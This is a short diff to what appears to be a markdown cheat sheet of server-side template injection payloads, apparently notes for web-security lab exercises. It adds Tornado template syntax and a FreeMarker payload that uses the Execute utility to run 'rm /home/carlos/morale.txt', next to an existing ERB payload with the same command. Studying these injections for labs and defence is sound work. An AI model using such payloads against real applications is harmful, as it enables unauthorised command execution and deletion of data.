@@ -16,3 +16,15 @@ payload - `<%= system("rm /home/carlos/morale.txt") %>` # Modify as per requirem
 
 > ### Tornado Template
 
+```py
+{% expression %} - commands using python
+{{expression}} - regular expression
+```
+
+---
+
+> ### Freemaker Template
+
+```py
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt") }
+```
